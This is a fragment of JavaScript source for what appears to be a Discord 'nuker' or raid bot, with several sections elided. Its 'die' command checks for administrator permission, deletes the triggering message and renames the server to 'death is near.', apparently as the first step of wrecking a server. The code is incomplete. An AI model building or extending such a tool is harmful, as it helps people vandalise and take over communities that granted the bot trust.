...
client.on("ready", () => {
    ...
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "presser" }); // Delete this if you want.
});
...
\` [text]
    ...
    if (!DisableEveryone) {
        ...
        if (message.content.startsWith(prefix + 'die')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                message.delete();
                message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} jebated`))); // changes server name
